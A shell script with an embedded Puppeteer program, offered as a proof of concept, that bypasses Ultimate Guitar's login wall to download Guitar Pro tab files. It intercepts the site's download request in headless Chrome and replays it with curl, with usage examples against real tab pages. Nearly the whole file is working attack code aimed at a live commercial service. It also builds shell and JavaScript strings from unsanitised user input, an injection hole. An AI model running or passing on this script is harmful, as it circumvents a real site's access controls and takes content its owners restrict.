#!/usr/bin/env sh                                     
#                                          Jan 14, 2025                                          
#                                 ADMIN]at[DTRH]dot[NET
#        █▀▀ █▀▀ █░░█ █▀▀█ ▒█░▒█ ▒█▀▀▀ ▀█▀ ▒█▀▀▀█ ▀▀█▀▀ 
#        █▀▀ █░░ █▀▀█ █░░█ ▒█▀▀█ ▒█▀▀▀ ▒█░ ░▀▀▀▄▄ ░▒█░░ 
#        ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀▀ ▒█░▒█ ▒█▄▄▄ ▄█▄ ▒█▄▄▄█ ░▒█░░
#
# #####################################################
# PoC - Primary   - Broken Access Policy
#       Secondary - Authentication Bypass
#       [ https://www.ultimate-guitar.com ]

# What is echoHEIST?
# echoHEIST.sh allows anyone to bypass the authentication wall 
# while trying to download guitar pro files from the website 
# above. It leverages nodejs + puppeteer but is run from a 
# cross-platform shell environment:  
#
# Usage: chmod +x echoHEIST.sh && ./echoHEIST.sh [URL]
#        Or on Windows: bash echoHEIST.sh [URL]

# Enhanced cross-platform compatibility and error handling
set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print colored output
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_debug() {
    echo -e "${CYAN}[DEBUG]${NC} $1"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to get platform info
get_platform() {
    case "$(uname -s)" in
        Linux*)     echo "Linux";;
        Darwin*)    echo "macOS";;
        CYGWIN*)    echo "Windows";;
        MINGW*)     echo "Windows";;
        MSYS*)      echo "Windows";;
        *)          echo "Unknown";;
    esac
}

# Function to find Chrome executable
find_chrome() {
    local platform=$(get_platform)
    local chrome_paths=""
    
    case "$platform" in
        "Linux")
            chrome_paths="/usr/bin/google-chrome /usr/bin/google-chrome-stable /usr/bin/chromium /usr/bin/chromium-browser /snap/bin/chromium /opt/google/chrome/chrome"
            ;;
        "macOS")
            chrome_paths="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome /Applications/Chromium.app/Contents/MacOS/Chromium"
            ;;
        "Windows")
            chrome_paths="/c/Program Files/Google/Chrome/Application/chrome.exe /c/Program Files (x86)/Google/Chrome/Application/chrome.exe"
            ;;
    esac
    
    for path in $chrome_paths; do
        if [ -f "$path" ]; then
            echo "$path"
            return 0
        fi
    done
    
    return 1
}

# The disclosure report can be found here : 
#  

usage() {
  echo "Usage: $0 <URL> [output_filename]"
  echo ""
  echo "Examples:"
  echo "  $0 https://tabs.ultimate-guitar.com/tab/metallica/one-guitar-pro-54157"
  echo "  $0 https://tabs.ultimate-guitar.com/tab/metallica/one-guitar-pro-54157 metallica_one.gpx"
  echo ""
  echo "Environment Variables:"
  echo "  DEBUG=1          Enable debug output"
  echo "  CHROME_PATH=...  Specify Chrome executable path"
  exit 1
}

# Check for URL argument
if [ -z "$1" ]; then
  print_error "No URL provided"
  usage
fi

# Display startup information
print_info "echoHEIST - Ultimate Guitar Tab Downloader"
print_info "Platform: $(get_platform)"
print_info "Node.js: $(node --version 2>/dev/null || echo 'Not found')"
print_info "URL: $1"

# Check dependencies
if ! command_exists node; then
  print_error "Node.js is not installed or not in PATH"
  exit 1
fi

if ! command_exists curl; then
  print_error "curl is not installed or not in PATH"
  exit 1
fi

# Filename generation is rudimentary but works.
iURL="$1"
oName=$(echo "$iURL" | sed -E 's|https://tabs.ultimate-guitar.com/tab/||' | sed 's|/|_|g' | sed -E 's/_GP.*//')

# Use provided filename or generate one
if [ -n "$2" ]; then
  oFile="$2"
  print_info "Using provided filename: $oFile"
else
  oFile="${oName}.gpx"
  print_info "Generated file name: $oFile"
fi

# Validate URL format
if ! echo "$iURL" | grep -q "tabs.ultimate-guitar.com"; then
  print_warning "URL does not appear to be from tabs.ultimate-guitar.com"
fi

# Enhanced echoHEIST function with cross-platform support
echoHEIST() {
  print_info "Listening for web requests directed towards 'tabs.ultimate-guitar.com/download/public/'"

  # Find Chrome executable
  local chrome_path=""
  if [ -n "$CHROME_PATH" ]; then
    chrome_path="$CHROME_PATH"
    print_info "Using Chrome path from environment: $chrome_path"
  else
    chrome_path=$(find_chrome)
    if [ $? -eq 0 ]; then
      print_info "Found Chrome executable: $chrome_path"
    else
      print_warning "Chrome not found, using system default"
    fi
  fi

  # Start Puppeteer to listen for network requests
  local node_script="
    const puppeteer = require('puppeteer');
    const { exec } = require('child_process');
    const fs = require('fs');

    (async () => {
      let browser;
      try {
        const launchOptions = {
          headless: 'new',
          args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--disable-gpu'
          ]
        };

        if ('$chrome_path') {
          launchOptions.executablePath = '$chrome_path';
        }

        console.log('Launching browser...');
        browser = await puppeteer.launch(launchOptions);
        console.log('Browser launched successfully');

        const page = await browser.newPage();
        
        // Set user agent
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        // Enable network request interception
        await page.setRequestInterception(true);
        
        let downloadInitiated = false;
        let requestCount = 0;

        page.on('request', (request) => {
          requestCount++;
          const url = request.url();

          if ('$DEBUG' === '1') {
            console.log('Request #' + requestCount + ': ' + url);
          }

          // Match the desired request
          if (url.includes('tabs.ultimate-guitar.com/download/public/')) {
            console.log('Captured download request: ' + url);
            downloadInitiated = true;

            // Rebuild the curl command
            const headers = Object.entries(request.headers())
              .map(([key, value]) => \`-H '\${key}: \${value}'\`)
              .join(' ');

            const curlCommand = \`curl -sSL --fail \${headers} --output '${oFile}' '\${url}'\`;

            console.log('Executing curl command...');
            exec(curlCommand, (error, stdout, stderr) => {
              if (error) {
                console.error('Download error:', error.message);
                process.exit(1);
              }
              if (stderr) {
                console.error('Download stderr:', stderr);
              }
              console.log('Download complete: ${oFile}');
              
              // Verify file was created and has content
              if (fs.existsSync('${oFile}') && fs.statSync('${oFile}').size > 0) {
                console.log('File verified: ${oFile} (' + fs.statSync('${oFile}').size + ' bytes)');
              } else {
                console.error('Downloaded file is empty or missing');
                process.exit(1);
              }
            });
          }
          request.continue();
        });

        // Navigate to the provided URL
        console.log('Navigating to ${iURL}...');
        await page.goto('${iURL}', { 
          waitUntil: 'networkidle2', 
          timeout: 60000 
        });

        // Wait to ensure all requests are captured
        console.log('Waiting for network activity...');
        await new Promise(resolve => setTimeout(resolve, 3000));

        if (!downloadInitiated) {
          console.error('No download request was captured. This might not be a Guitar Pro tab or requires different handling.');
          process.exit(1);
        }

      } catch (error) {
        console.error('Error during operation:', error.message);
        process.exit(1);
      } finally {
        if (browser) {
          await browser.close();
          console.log('Browser closed');
        }
      }
    })();
  "

  if [ "$DEBUG" = "1" ]; then
    print_debug "Executing Node.js script with debug output"
    node -e "$node_script"
  else
    node -e "$node_script"
  fi
}

echoHEIST   # Regex, Replay, Redirect 

# KBS <admin [at] dtrh [dot] net
# https://dtrh.net
# eof
